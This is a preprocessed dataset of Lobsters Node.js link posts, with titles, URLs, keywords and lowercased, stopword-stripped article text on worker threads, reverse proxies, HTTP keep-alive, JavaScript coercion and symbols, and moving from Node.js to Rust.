anypath use window posix path interchangeably fetching value object devnullcli crossplatform devnull signal fkill kill process crossplatform signalexit crossplatform exit handler process stream desktop ui open open stuff like website file executables crossplatform nodenotifier crossplatform desktop notification window registry known issue cmdexe unicode woe default cmdexe display unicode character window spawn issue childprocessspawn behavior consistent window linux exec behavior shell depending shell used eg bash v dash childprocessexec inconsistent exit behavior see also support found error would like add information nt hesitate submit issue github everyone welcome regardless personal background enforce code conduct order promote positive inclusive environment contributing project made simplest way give back starring sharing online documentation unclear typo please click page edit button pencil icon suggest correction would like help u fix error add information please check guideline pull request welcome thanks go wonderful people project follows allcontributors specification license
124,Lobsters,nodejs,Node.js programming,Show some love to Node.js process errors,https://github.com/ehmicky/log-process-errors,show love nodejs process error,medium article use case logging debugging testing demo install usage cli flag option log full documentation level full documentation exiton full documentation testing full documentation color full documentation support submit issue github chat u gitter code conduct contributing guideline,medium article show nodejs process error nodejs print process error uncaughtexception warning unhandledrejection rejectionhandled console useful unfortunately error logprocesserrors fix issue without logprocesserrors logprocesserrors use case proper logging process error production debugging process error development automated testing process error demo try library install production code eg server install either production development dependency npm install logprocesserrors however library install development dependency npm install logprocesserrors logging modified globally library user might expect sideeffect also might lead conflict library usage two way load library first use node r cli flag node r logprocesserrorsbuildregister second const logprocesserrors require logprocesserrors logprocesserrors option logprocesserrors called early possible code requireimport statement option option optional object following property log type function error level originalerror customizes process error logged full documentation level type object default warning warn multipleresolves info default error log level use full documentation exiton type string default uncaughtexception process error trigger processexit full documentation testing type string value ava mocha jasmine tape nodetap default undefined running test make fail process error full documentation color type boolean default true output terminal colorizes message full documentation support found bug would like new feature nt hesitate submit issue github question feel free chat u gitter everyone welcome regardless personal background enforce code conduct order promote positive inclusive environment contributing project made simplest way give back starring sharing online documentation unclear typo please click page edit button pencil icon suggest correction would like help u fix bug add new feature please check guideline pull request welcome thanks go wonderful contributor
125,Lobsters,nodejs,Node.js programming,Why should I use a Reverse Proxy if Node.js is Production-Ready?,https://medium.com/intrinsic/why-should-i-use-a-reverse-proxy-if-node-js-is-production-ready-5a079408b2ca,use reverse proxy nodejs productionready,use reverse proxy nodejs productionready concurrent connection reverse proxy nginx haproxy use reverse proxy ssl termination let encrypt potentially malicious module gzip compression clustering enterprise routing performance benefit approx memory intrinsiclabsnodejsreverseproxybenchmarks simplified application code,use reverse proxy nodejs productionready year php ruby rail reigned supreme serverside technology rendering web application bold new contender took community storm one managed handle concurrent connection technology none nodejs steadily increased popularity ever sinceunlike competing technology time nodejs came web server built server meant developer could bypass myriad configuration file phpini hierarchical collection htaccess file builtin web server also afforded convenience like ability process file uploaded ease implementing websocketsevery day nodejspowered web application happily handle billion request largest company world powered manner nodejs say nodejs productionready certainly understatement however one piece advice held true since nodejs inception one directly expose nodejs process web instead hide behind reverse proxy look reason would want use reverse proxy let first look one iswhat reverse proxy reverse proxy basically special type web server receives request forward another http server somewhere else receives reply forward reply original requestera reverse proxy usually send exact request though typically modify request manner example reverse proxy life going forward request probably rewrite original host header match target may also modify request way cleaning malformed request translating protocolsonce reverse proxy receives response may translate response manner common approach modify host header match original request body request changed well common modification perform gzip compression response another common change enable http support underlying service speaks httpreverse proxy also dispatch incoming request multiple backend instance service exposed apiexampleorg reverse proxy could forward request etcthere many different reverse proxy two popular one nginx haproxy tool able perform gzip compression add http support specialize area well nginx popular two choice also beneficial capability ability serve static file filesystem use example throughout articlenow know reverse proxy look would want make use one nodejswhy use reverse proxy ssl terminationssl termination one popular reason one us reverse proxy changing protocol one application http http take little work appending nodejs able perform necessary encryption decryption http configured read necessary certificate fileshowever configuring protocol used communicate application managing everexpiring ssl certificate really something application need concerned checking certificate codebase would tedious also security risk acquiring certificate central location upon application startup also risksfor reason better perform ssl termination outside application usually within reverse proxy thanks technology like certbot let encrypt maintaining certificate nginx easy setting cron job job automatically install new certificate dynamically reconfigure nginx process much le disruptive process say restarting nodejs application instancealso allowing reverse proxy perform ssl termination mean code written reverse proxy author access private ssl certificate however nodejs application handling ssl every single third party module used application even potentially malicious module access private ssl certificategzip compressiongzip compression another feature offload application reverse proxy gzip compression policy something best set organization level instead specify configure applicationit best use logic deciding gzip example file small perhaps smaller probably worth compressing gzip compressed version sometimes larger cpu overhead client decompress file might worth also dealing binary data depending format might benefit compression gzip also something simply enabled disabled requires examining incoming acceptencoding header compatible compression algorithmsclusteringjavascript singlethreaded language accordingly nodejs traditionally singlethreaded server platform though currentlyexperimental worker thread support available nodejs aim change mean getting much throughput nodejs application possible requires running roughly number instance cpu coresnodejs come builtin cluster module incoming http request made master process dispatched cluster workershowever dynamically scaling cluster worker would take effort also usually added overhead running additional nodejs process dispatching master process also scaling process across different machine something cluster dofor reason sometimes better use reverse proxy dispatch request running nodejs process reverse proxy dynamically configured point new application process arrive really application concerned work concerned managing multiple copy dispatching requestsenterprise routingwhen dealing massive web application one built multiteam enterprise useful reverse proxy determining forward request example request made exampleorgsearch routed internal search application request made exampleorgprofile dispatched internal profile applicationsuch tooling allows powerful feature sticky session bluegreen deployment ab testing etc personally worked codebase logic performed within application approach made application quite hard maintainperformance benefitsnodejs highly malleable able serve static asset filesystem perform gzip compression http response come builtin support http many feature even ability run multiple instance application perform request dispatching way cluster moduleand yet ultimately best interest let reverse proxy handle operation u instead nodejs application reason listed another reason wanting operation outside nodejs due efficiencyssl encryption gzip compression two highly cpubound operation dedicated reverse proxy tool like nginx haproxy typically perform operation faster nodejs web server like nginx read static content disk going faster nodejs well even clustering sometimes efficient reverse proxy like nginx use le memory cpu additional nodejs processbut take word let run benchmark following load testing performed using siege ran command concurrency value simultaneous user making request command would run iteration made overall request check memory run command pmap pid grep total time throughout lifetime benchmark average result running nginx single worker thread end two instance running one master worker sum two value running nodejs cluster process one master two worker approx memory column following table total sum nginx nodejs process given testhere result benchmark benchmark resultsin nodecluster benchmark use worker mean nodejs process running master worker nginxclusternode benchmark nodejs process running nginx test single nginx master single nginx worker process benchmark involve reading file disk neither nginx nodejs configured cache file memoryusing nginx perform ssl termination nodejs result throughput increase using nginx perform gzip compression result throughput increase using nginx manage cluster process resulted performance penalty probably due overhead passing additional request loopback network deviceessentially memory usage single nodejs process memory usage nginx process around fluctuate little depending feature used example nodejs us additional performing ssl termination nginx us additional used reverse proxy verse serving static content filesystem interesting thing note nginx us consistent amount memory throughout lifetime however nodejs constantly fluctuates due garbagecollecting nature javascripthere version software used performing benchmark nginx test performed machine memory cpu linux kernel necessary file required recreate benchmark available intrinsiclabsnodejsreverseproxybenchmarkssimplified application codebenchmarks nice opinion biggest benefit offloading work nodejs application reverse proxy code simplicity get reduce number line potentiallybuggy imperative application code exchange declarative configuration common sentiment amongst developer confident code written external team engineer nginx code written themselvesinstead installing managing gzip compression middleware keeping uptodate across various nodejs project instead configure single location instead shipping downloading ssl certificate either reacquiring restarting application process instead use existing certificate management tool instead adding conditionals application check process master worker offload another toola reverse proxy allows application focus business logic forget protocol process management
126,Lobsters,nodejs,Node.js programming,I got node working on an iPhone thanks to the new JITless feature,https://twitter.com/theshawwn/status/1110691089009254400,got node working iphone thanks new jitless feature,,detected javascript disabled browser would like proceed legacy twitter yes
127,Lobsters,nodejs,Node.js programming,Customize objects coercion in JavaScript,https://dev.to/jfet97/customize-objects-coercion-in-javascript-83d,customize object coercion javascript,introduction coercion customization tostring valueof objectprototype valueof tostring class tostring tostring valueof typeerror warning null undefined string number boolean unary unary binary valueof tostring binary loose equality valueof string valueof nan customization hint number string default string tostring number default valueof date default tostring hint valueof tostring typeerror symboltoprimitive tostring valueof typeerror binary operator binary unary unary,introduction javascript unlike programming language nt allow operator overloading allows u modify primitive value object transformed object coerced result must primitive value unfortunately consider opportunity paltry consolation prize control obtain quite limited case could always useful know possibility language offer u considering brought solution considerable value whole article based good number concept related coercion fact modify result coercion performed object customization since coercion object strongly based tostring valueof method callable default object could simply redefine method object use word redefine two method callable default javascript object automatically linked objectprototype object thanks called prototype chain object defines fair number method therefore invocable directly object connected learn redefine behaviour let see default one var object prop value objectvalueof object objecttostring object object see valueof simply return object reference instead method tostring read value class internal property construct well know object object string also array object behaviour tostring method already redefined default var array arrayvalueof array arraytostring object coerced depending initial condition method tostring valueof take precedence return primitive value valueof method objectprototype method invoked fallback even nt return primitive value typeerror raised warning could decide return null undefined redefine method valid primitive value however javascript never lead result object make available u follow example returning one string number boolean numerical operation like number obj obj unary unary binary clearly prioritize valueof method explicit coercion operation like string obj give priority tostring method doubt arise facing binary loose equality operator give priority valueof let see practice stuff help u reach goal var myobj tostring function return myobj valueof function return valueof precedence number myobj myobj myobj myobj myobj myobj myobj true tostring precedence string myobj myobj therefore redefined behaviour object may however satisfied result myobj preferring myobj unfortunately apart explicit coercion using string function way impose return string myobj valueof method well sacrificing possibility using object arithmetic operation penalty infinite series nan deriving coercion attempt myobj string number customization let introduce new concept hint object coerced primitive decision give priority one two method spoke earlier done thanks hint possible value hint number string default hint value string given precedence tostring method number default valueof method priority exception logic date type default hint value give priority tostring method let see hint forwarded main operation seen far hint operation string string interpolation number number unary unary binary default binary may seem opposite also based concept difference lie possibility offered interact directly mechanism necessary provide object method special name take string value hint based decide like manually call valueof tostring method wish invoke method important thing produce primitive value end result avoid running typeerror special name method symboltoprimitive article talk symbol necessary confidence reach goal let see possible implementation allows u obtain behavior defined let obj symboltoprimitive hint check value object const isobject value value null typeof value object typeof value function switch hint case default case number precedence valueof hint number default const value thisvalueof result primitive returned isobject value return value otherwise tostring method used fallback else return thistostring case string precedence tostring hint string const string thistostring result primitive returned isobject string return string otherwise valueof method used fallback else return thisvalueof could tostring valueof method trustable could lead typeerror let see possible workaround let obj symboltoprimitive hint check value object const isobject value value null typeof value object typeof value function switch hint case default case number precedence valueof hint number default let re thisvalueof result primitive returned isobject re return re otherwise tostring method used fallback re thistostring result primitive returned isobject re return re otherwise return appropriate primitive value return nan case string precedence tostring hint string let re thistostring result primitive returned isobject string return string otherwise valueof method used fallback re thisvalueof result primitive returned isobject re return re otherwise return appropriate primitive value return easily add substantial change mechanism bearing mind table shown practical example take previously defined myobj object wanted object transformed string value instead numeric one binary operator come action table illustrates operator also affected change let myobj tostring return myobj valueof return symboltoprimitive hint switch hint case number return thisvalueof case default case string return thistostring worth noting could still use numeric value myobj binary operation operator necessary thanks unary table confirms statement unary suggests number myobj myobj greeting myobj greeting myobj myobj myobj true myobj greeting myobj greeting myobj true
128,Lobsters,nodejs,Node.js programming,A complete guide to threads in Node.js,https://blog.logrocket.com/a-complete-guide-to-threads-in-node-js-4fa3898fe74f,complete guide thread nodejs,nodejs ryan dahl nodejs really work libuv introducing exchanging data thread data argument structured clone algorithm sharing memory thread read post create similar structure argument creating channel communication two way using worker useful property available module implementing review code implementing worker pool limiting concurrent operation conclusion monitor failed slow network request production try logrocket http logrocketcomsignup logrocket start monitoring free,many people wonder singlethreaded nodejs compete multithreaded back end may seem counterintuitive many huge company pick node back end given supposed singlethreaded nature know understand really mean say node singlethreaded javascript created good enough simple thing web like validate form say create rainbowcolored mouse trail ryan dahl creator nodejs made possible developer use language write backend code backend language generally support multithreading kind mechanism syncing value thread threadoriented feature add support thing javascript would require changing entire language really dahl goal plain javascript support multithreading create workaround let explore nodejs really work nodejs us two kind thread main thread handled event loop several auxiliary thread worker pool event loop mechanism take callback function register executed point future operates thread proper javascript code javascript operation block thread event loop blocked well worker pool execution model spawn handle separate thread synchronously perform task return result event loop event loop executes provided callback said result short take care asynchronous io operation primarily interaction system disk network mainly used module f ioheavy crypto cpuheavy worker pool implemented libuv result slight delay whenever node need communicate internally javascript c hardly noticeable mechanism able write code like fsreadfile pathjoin dirname packagejson err content err return null consolelog contenttostring aforementioned f module tell worker pool use one thread read content file notify event loop done event loop take provided callback function executes content file example nonblocking code wait synchronously something happen tell worker pool read file call provided function result since worker pool thread event loop continue executing normally file read good need synchronously execute complex operation function take long run block thread application many function could significantly decrease throughput server freeze altogether case way delegating work worker pool field require complex calculation ai machine learning big data really use nodejs efficiently due operation blocking main thread making server unresponsive case nodejs came added support multiple thread introducing workerthreads workerthreads module package allows u create fully functional multithreaded nodejs application thread worker piece code usually taken file spawned separate thread note term thread worker worker thread often used interchangeably refer thing start using thread worker import workerthreads module let start creating function help u spawn thread worker talk little bit property type workercallback err result export function runworker path string cb workercallback workerdata object null null const worker new worker path workerdata workeron message cbbind null null workeron error cb workeron exit exitcode exitcode return null return cb new error worker stopped code exitcode return worker create worker create instance worker class first argument provide path file contains worker code second provide object containing property called workerdata data like thread access start running note whether use javascript something transpiles javascript eg typescript path always refer file either j mjs extension would also like point used callback approach opposed returning promise would resolved message event fired worker dispatch many message event one see example communication thread eventbased mean setting listener called given event sent worker common event workeron error error error event emitted whenever uncaught exception inside worker worker terminated error available first argument provided callback workeron exit exitcode exit emitted whenever worker exit processexit called inside worker exitcode would provided callback worker terminated workerterminate code would workeron online online emitted whenever worker stop parsing javascript code start execution used often informative specific case workeron message data message emitted whenever worker sends data parent thread let take look data shared thread exchanging data thread send data thread use portpostmessage method following signature portpostmessage data transferlist port object either parentport instance messageport later data argument first argument called data object copied thread contain anything copying algorithm support data copied structured clone algorithm per mozilla build clone recursing input object maintaining map previously visited reference order avoid infinitely traversing cycle algorithm copy function error property descriptor prototype chain also noted copying object way different json contain circular reference typed array example whereas json supporting copying typed array algorithm make possible share memory thread sharing memory thread people may argue module like cluster childprocess enabled use thread long time ago well yes cluster module create multiple node instance one master process routing incoming request clustering application allows u effectively multiply server throughput however spawn separate thread cluster module people tend use tool like cluster application opposed manually inside code interested read post use cluster module childprocess module spawn executable regardless whether javascript pretty similar lack several important feature workerthreads specifically thread worker lightweight share process id parent thread also share memory parent thread allows avoid serializing big payload data result send data back forth much efficiently let take look example share memory thread order memory shared instance arraybuffer sharedarraybuffer must sent thread data argument inside data argument worker share memory parent thread import parentport workerthreads parentporton message const numberofelements const sharedbuffer new sharedarraybuffer numberofelements const arr new sharedbuffer let numberofelements arr mathround mathrandom parentportpostmessage arr first create sharedarraybuffer memory needed contain integer next create instance use buffer save structure fill array random number send parent thread parent thread import path path import runworker runworker const worker runworker pathjoin dirname workerjs err arr err return null arr workerpostmessage changing arr actually change thread course sharing memory risk changing value one thread changed also gain nice feature along way value need serialized available another thread greatly increase efficiency simply remember manage reference data properly order garbagecollected finish working sharing array integer fine really interested sharing object default way storing information unfortunately sharedobjectbuffer similar create similar structure transferlist argument transferlist contain arraybuffer messageport transferred thread longer used sending thread memory moved thread thus unavailable sending one time transfer network socket including transferlist childprocess module creating channel communication communication thread made port instance messageport class enable eventbased communication two way using port communicate thread first default easier two within worker code import object called parentport workerthreads module use object postmessage method send message parent thread example import parentport workerthreads const data parentportpostmessage data parentport instance messageport nodejs created u behind scene enable communication parent thread way communicate thread using parentport worker object second way communicating thread actually create messagechannel send worker could create new messageport share worker import path path import worker messagechannel workerthreads const worker new worker pathjoin dirname workerjs const new messagechannel message message consolelog message worker message workerpostmessage port creating set event listener send worker include transferlist transferred worker side inside worker import parentport messageport workerthreads parentporton message data const port port messageport data portpostmessage here message way use port sent parent thread using parentport necessarily wrong approach better create new messageport instance messagechannel share spawned worker read separation concern note example use parentport keep thing simple two way using worker two way use worker first spawn worker execute code send result parent thread approach time new task come create worker second way spawn worker set listener message event time message fired work sends result back parent thread keep worker alive later usage nodejs documentation recommends second approach much effort take actually create thread worker requires creating virtual machine parsing executing code method also much efficient constantly spawning worker approach called worker pool create pool worker keep waiting dispatching message event work needed example file contains worker spawned executed closed import parentport workerthreads const collection let collection parentportpostmessage collection sending collection parent thread simply exit example worker wait long period time given task import parentport workerthreads parentporton message data const result dosomething data parentportpostmessage result useful property available workerthreads module property available inside workerthreads module ismainthread property true operating inside worker thread feel need include simple statement start worker file make sure run worker import ismainthread workerthreads ismainthread throw new error worker workerdata data included worker constructor spawning thread const worker new worker path workerdata worker thread import workerdata workerthreads consolelog workerdataproperty parentport aforementioned instance messageport used communicate parent thread threadid unique identifier assigned worker know technical detail let implement something test knowledge practice implementing settimeout settimeout infinite loop name implies time app practice check iteration whether sum starting date given number millisecond smaller actual date import parentport workerdata workerthreads const time datenow true time workerdatatime datenow parentportpostmessage break particular implementation spawn thread executes code exit done let try implementing code make use worker first let create state keep track spawned worker const timeoutstate key string worker function take care creating worker saving state export function settimeout callback err time number const id const worker runworker pathjoin dirname timeoutworkerjs err timeoutstate id return null timeoutstate id null err return callback err callback null time timeoutstate id worker return id first use uuid package create unique identifier worker use previously defined helper function runworker get worker also pas worker callback function fired worker sends data finally save worker state return id inside callback function check whether worker still exists state possibility canceltimeout would remove exist remove state invoke callback passed settimeout function canceltimeout function us terminate method force worker quit remove worker state export function canceltimeout id string timeoutstate id timeoutstate id terminate timeoutstate id undefined return true return false interested also implemented setinterval since nothing thread reuse code settimeout decided include explanation created little test code purpose checking much approach differs native one review code result native settimeout m averagecpucost worker settimeout m averagecpucost see slight delay settimeout due worker created average cpu cost also little bit higher nothing unbearable cpu cost average cpu usage across whole duration process could reuse worker would lower delay cpu usage take look implement worker pool implementing worker pool mentioned worker pool given number previously created worker sitting listening message event message event fired work send back result better illustrate going would create worker pool eight thread worker const pool new workerpool pathjoin dirname testworkerjs familiar limiting concurrent operation see logic almost different use case shown code snippet pas constructor workerpool path worker number worker spawn export class workerpool n private queue queueitem n private workersbyid key number worker private activeworkersbyid key number boolean public constructor public workerpath string public numberofthreads number thisinit additional property like workersbyid activeworkersbyid save existing worker id currently running worker respectively also queue save object following structure type queuecallback n err result n void interface queueitem n callback queuecallback n getdata callback default node callback error first argument possible result second getdata function passed worker pool run method explained called item start processed data returned getdata function passed worker thread inside init method create worker save state private init thisnumberofthreads return null let thisnumberofthreads const worker new worker thisworkerpath thisworkersbyid worker thisactiveworkersbyid false avoid infinite loop first ensure number thread create valid number worker save index workersbyid state save information whether currently running inside activeworkersbyid state first always false default implement aforementioned run method set task run worker available public run getdata return new promise n resolve reject const availableworkerid thisgetinactiveworkerid const queueitem queueitem n getdata callback error result error return reject error return resolve result availableworkerid thisqueuepush queueitem return null thisrunworker availableworkerid queueitem inside function passed promise first check whether worker available process data calling getinactiveworkerid private getinactiveworkerid number let thisnumberofthreads thisactiveworkersbyid return return next create queueitem save getdata function passed run method well callback callback either resolve reject promise depending whether worker passed error callback availableworkerid available worker add queueitem queue available worker call runworker method execute worker runworker method set inside activeworkersbyid state worker currently used set event listener message error event clean afterwards finally send data worker private async runworker workerid number queueitem queueitem n const worker thisworkersbyid workerid thisactiveworkersbyid workerid true const messagecallback result n queueitemcallback null result cleanup const errorcallback error queueitemcallback error cleanup const cleanup workerremovealllisteners message workerremovealllisteners error thisactiveworkersbyid workerid false thisqueuelength return null thisrunworker workerid thisqueueshift workeronce message messagecallback workeronce error errorcallback workerpostmessage await queueitemgetdata first using passed workerid get worker reference workersbyid state inside activeworkersbyid set workerid property true know run anything else worker busy next create messagecallback errorcallback called message error event respectively register said function listen event send data worker inside callback call queueitem callback call cleanup function inside cleanup function make sure event listener removed since reuse worker many time remove listener would memory leak essentially would slowly run memory inside activeworkersbyid state set workerid property false check queue empty remove first item queue call worker different queueitem let create worker calculation receiving data message event import ismainthread parentport workerthreads ismainthread throw new error worker const docalcs data const collection let collection mathround mathrandom return collectionsort b b return return parentporton message data const result docalcs data parentportpostmessage result worker creates array million random number sort really matter happens long take time finish example simple usage worker pool const pool new workerpool number number pathjoin dirname testworkerjs const item new array fill null promiseall itemsmap async await poolrun consolelog finished consolelog finished start creating pool eight worker create array element element run task worker pool first eight task executed immediately rest put queue gradually executed using worker pool create worker time vastly improves efficiency conclusion workerthreads provide fairly easy way add multithreading support application delegating heavy cpu computation thread significantly increase server throughput official thread support expect developer engineer field like ai machine learning big data start using nodejs monitor failed slow network request production deploying nodebased web app website easy part making sure node instance continues serve resource app thing get tougher interested ensuring request backend third party service successful try logrocket http logrocketcomsignuplogrocket like dvr web apps recording literally everything happens site instead guessing problem happen aggregate report problematic network request quickly understand root cause logrocket instrument app record baseline performance timing page load time time first byte slow network request also log redux ngrx vuex actionsstate start monitoring free
129,Lobsters,nodejs,Node.js programming,Intro to web programming in Rust for NodeJS developers,https://medium.com/@gruberbastian/intro-to-web-programming-in-rust-for-nodejs-developers-1a9c048c4de1,intro web programming rust nodejs developer,intro web development rust nodejs developer easy tutorial nodejs v rust llvm library much web rust include standard http library rust tcp actix rocket hyper tinyhttp npm v cargo cargo handling everything related project open pr ecosystem arewewebyetorg tide asnyc programming aka promise aka future future tokio areweasyncyet get started rocket actix head undefined borrowing type option result homework click try check get request errored return error case instead ok borrowing homework click figure code fails solve look rust track exercismio rust book mentioned first article twitter medium,intro web development rust nodejs developersrust different pick python ruby weekend create first crud application happy resultswith rust struggle pas string different method change return order rust book see size sigh get startedafter week fighting book work give wait someone else creates easytofollow tutorialhere easy tutoriali struggled problem life circumstance however gave month time hand really focus rustwhat follows first overview concept path follow coming week month publish series article help get concept productnodejs v rustafter installing chose brew macos example method matter underlying stack look different nodejs need runtime engine google binding javascript library run javascript coderust depends almost completely rust compiler using llvm library written c chow much web rust design decision include standard http library rust osi layer therefore covered differently node cover whole stack offer koa express two wellknown rocksolid web framework help build application top httpon rust side thing tcp implemented rust core current web framework actix rocket implementing everything http though need care coming fromif want use pure http call without larger framework install crate equivalent npm package node world implement http protocol like hyper tinyhttp npm v cargonode using npm package management npm install installing dependenciesnpm run xyz executing script inside packagejsonon rust side cargo handling everything related project cargo new name bin creating applicationcargo new name lib create librarycargo run executing codecargo build creating executablecargo test running test inside projectthere open pr add cargo add install dependency right add hand cargotoml file see need include script packagejson run test build test applicationmindset change cargo fetching package cargo run version changed first time fetch package second time change version number happened unlike npm fetch package right away add packagejson save notationecosystemnode successful reason ecosystem rich flourishing rust still developing already many great crate website arewewebyetorg tracking progress showing interesting package rust worldthere also attempt create official rust web framework called tide already pretty mature used side project feel free contribute help craft great environment web development rustasnyc programming aka promise aka futuresnodes killer feature promise although always easy understand handle promise event loop make node lucrativerust also implementing asynchronous mechanism yet final version called future library called tokio already offering asynchronous run time track progress asynchronous programming rust areweasyncyethow get started install rust curl http shrustuprs ssf shcreate new project cargo new webapp bincd webappnow choose web framework choice either start rocket actix follow tutorial website get first web application runningheads undefined borrowing typesto get frustrated next post main four thing rust get used quite awesome following example cover already great amount new concept make sure add reqwest cargotoml dependency reqwest undefined rust real null value feature rust type called option encapsulates either return value none case use result type return value could instead returning string return option might string value none website fetching contain text easy solution use production unwrap result get string encapsulation homework click try check get request errored return error case instead ok must heard borrowing short every assignment non trivial type everything fixed size move ownership method fetchtext taking ownership url using reference via homework click figure code fails solve ityou always know type returned method example http crate reqwest returning response struct type implement certain method documentation many crate excellent look hereyou type return return value method put end statement becomes return valueuse example play around see get error learn fix themis two opinion sadly good thing actually learn decent amount rust get started next day week month cover basic creating solid web applicationup recommend rust track exercismio rust book find also paper version local book store amazona mentioned first article rust making better developer road long time always worth follow twitter medium stay date
130,Lobsters,nodejs,Node.js programming,Moving from NodeJS to Rust in 2019,https://medium.com/@foreach/moving-from-nodejs-to-rust-in-2019-62c0b85d2fa7,moving nodejs rust,moving nodejs rust nuanced introduction indepth introduction web programming rut read part x series twitter rust new javascript wasm rust able run browser well rust logical next step type rust new bitcoin better although generic yet thing yet goland github discord documentation rust doc superb rust compiler part x get started web development rust nodejs perspective,moving nodejs rust nuanced introduction indepth introduction web programming rut read part x seriesif followed last week month twitter saw take rust pretty seriously latelyin article want talk reasoning behind nodejs developer consider samerust new javascriptjavascripts appeal come mainly easytouse availableeverywhere characteristic choice browser build applicationsit also shine server side thing easy use framework easy syntax static typesbuilding web application nodejs take literally hour react frontend always evolving powerful tool build complex applicationsso rust new javascript rust available server also run hardwarewith wasm rust able run browser wellas frontend developer nodejs helped get serverside programming learning rust help covering whole stack hardware server frontendrust logical next stepnodejs successful even large application got build however one missing piece type system static type microsoft step create typescript offer many people move c java familiar environmenthowever instead learning javascript learning tool microsoft add another layer top layer make javascript run serverlearning typescript bad pain learning rust good painwhen learn typescript mostly cope tool improve language lack well thought featuresif want type might need bigger application move typed language right away bother transpiler typesyou know saying biggest strength also biggest weakness well rust thing love static type system take time though type system prevent easily deploying crud app one hour help long run crafting sophisticated safe fast applicationsand used create rustwebstarter app get benefit crafting fast prototype would noderust new bitcoin betteri painted pretty simple picture would choose rust let say go since go static type well although generic yet thing yet goland rust new bitcoin majority contributers working mozilla took rust project published development language happens open everyone contribute decentralized wish everything happens github discordif mozilla would completely abandon language would still live flourish go however solely maintained within google know happens google project yearsit seem like go go anywhere language great super productive rust plus featuresdocumentationwhen talked leveling beginning meant leveling read stackoverflow fix random problemthe rust doc superb get used though structure explanation make sense start building application need helpthe rust compileryour biggest enemy best friend term good pain accurate come rust compiler hate even simple exercise fail beginning even easily pas string aroundbut got hang realize biggest strength compiler pair program compiler sure crafted solid application afterwardsrust still evolving might live city community strong yet rust compiler know everything approves code feel safe well updated part x get started web development rust nodejs perspective
131,Lobsters,nodejs,Node.js programming,"Stop Wasting Connections, Use HTTP Keep-Alive",https://lob.com/blog/use-http-keep-alive,stop wasting connection use http keepalive,verify mailing address even deliver physical mail http keepalive performance benefit http keepalive without connection reuse connection reuse flamegraph flamegraph without connection reuse flamegraph connection reuse nodekeepalivebenchmark reduced dns error error getaddrinfo enotfound nodejsnode tip reusing connection check timeouts error socket hang nt use node default http agent agentkeepalive wrap career page,image captionthe rich text element allows create format heading paragraph blockquotes image video one place instead add format individually doubleclick easily create contentwith proliferation thirdparty apis microservice architecture modern web server make many outgoing http request number incoming http request serve typical web application interact thirdparty apis handle payment processing send email track analytics dispatch text message verify mailing address even deliver physical mail server also rely internal apis fetch account information start asynchronous process perform complex search program initiate high volume outgoing http request must minimize overhead order remain performant optimize resource utilizationone best way minimize http overhead reuse connection http keepalive feature commonly enabled default many http client client maintain pool connection initializes handle multiple request connection closed reusing connection avoids overhead making dns lookup establishing connection performing ssl handshake however http client including default client nodejs enable http keepaliveone lob backend service heavily dependent internal external apis verify address dispatch webhooks start aws lambda execution nodejs server handful endpoint make several outgoing http request per incoming request enabling connection reuse outgoing request led increase maximum inbound request throughput significantly reduced cpu usage lowered response latency also eliminated sporadic dns lookup errorsperformance benefit http keepaliverunning benchmark validates performance benefit http keepalive following chart display total time taken make get request nonreused reused connection varying number request made concurrently show level tested concurrency reusing connection reduces total run time factor roughly observed benefit reusing http connection reduced cpu utilization mac o x reduction manifest node process process named mdnsresponder operating system service responsible resolving dns running top stats pid command cpu grep e mdnsrespondernode benchmark show contrast cpu usagewithout connection reusewith connection reuseinspecting flamegraph benchmark script without connection reuse reveals reason increased cpu utilization node large percentage cpu time spent establishing connection performing ssl handshake example flame fragment show measured cpu tick occurred creating noted initiating connection also incurs overhead http server therefore reusing connection also reduces overhead server handling requestsflamegraphs benchmark available explore flamegraph without connection reuse flamegraph connection reusethe benchmarking script documented nodekeepalivebenchmarkreduced dns errorsreusing connection also eliminated set dns error occurred sporadically within service connection reused new connection initialized outgoing request node initialization includes dns lookup determine ip domain send request high volume dns lookup lead sporadic error form error getaddrinfo enotfoundbased several issue node repository nodejsnode error occur dns server fail respond perhaps due ratelimiting request reducing dns lookup reduce eliminate errorstips reusing connectionscheck timeoutsin case reusing connection lead hardtodebug issue problem arise client assumes connection alive well discover upon sending request server terminated connection node problem surface error socket hang upto mitigate check idle socket timeouts client server value represents long connection kept alive data sent received make sure idle socket timeout client shorter server ensure client close connection server preventing client sending request unknowingly dead connectiondo nt use node default http agentsfor node service agentkeepalive library provides http http agent enable connection reuse default agent also sensible default standard library agent notwrap upconnection reuse provide significant performance improvement service written language making numerous outgoing http request http client enable behavior default widely used language library enable http keepalive default node sure check documentation source codeby way lob hiring interested joining growing company foster curiosity diligence collaboration love hear check career page
132,Lobsters,nodejs,Node.js programming,JavaScript Symbols: But Why?,https://medium.com/intrinsic/javascript-symbols-but-why-6b02768f4a5c,javascript symbol,javascript symbol background note symbol symbol object property note private field preventing property name collision descriptor simulating private property javascript object property descriptor proxy preventing extension nodejs caveat protecting javascript apis,javascript symbol symbol newest javascript primitive bring benefit language particularly useful used object property u string explore symbol much let first look javascript feature many developer might aware ofbackgroundthere essentially two type value javascript first type primitive second type object also includes function primitive value include simple value type number includes everything integer float infinity nan booleans string undefined null note even though typeof null object null still primitive value primitive value also immutable changed course variable primitive assigned reassigned example write code let x x reassigned variable x nt mutated primitive numeric value language c concept passbyreference passbyvalue javascript sort concept though inferred based type data passed around ever pas value function reassigning value modify value calling location however modify nonprimitive value modified value also modified called fromconsider following example function primitivemutator val val val let x primitivemutator x consolelog x objectmutator val valprop valprop let obj prop objectmutator obj consolelog objprop value except mystical nan value always exactly equal another primitive equivalent value check const first abc def const second ab cd ef consolelog first second truehowever constructing equivalent nonprimitive value result value exactly equal see happening const name intrinsic const name intrinsic consolelog false though name property primitive consolelog trueobjects play elemental role javascript language used everywhere often used collection keyvalue pair however big limitation using manner symbol existed object key could string ever attempt use nonstring value key object value coerced string see feature const obj objfoo foo obj bar bar obj obj someobj consolelog obj foo foo bar bar object object someobj note slightly topic map data structure created part allow keyvalue storage situation key stringwhat symbol know primitive value finally ready define symbol symbol primitive recreated case symbol similar object creating multiple instance result value exactly equal symbol also primitive mutated example symbol usage const symbol const symbol consolelog falsewhen instantiating symbol optional first argument choose provide string value intended used debugging code otherwise really affect symbol itselfconst symbol debug const str debug const symbol xxyy consolelog str falseconsolelog falseconsolelog symbol debug symbol object propertiessymbols another important use used key object example using symbol key within object const obj const sym symbol obj sym foo objbar bar consolelog obj bar bar consolelog sym obj trueconsolelog obj sym fooconsolelog objectkeys obj bar notice returned result objectkeys purpose backwards compatibility old code nt aware symbol result nt returned ancient objectkeys methodat first glance almost look like symbol used create private property object many programming language hidden property class omission long seen shortcoming javascriptunfortunately still possible code interacts object access property whose key symbol even possible 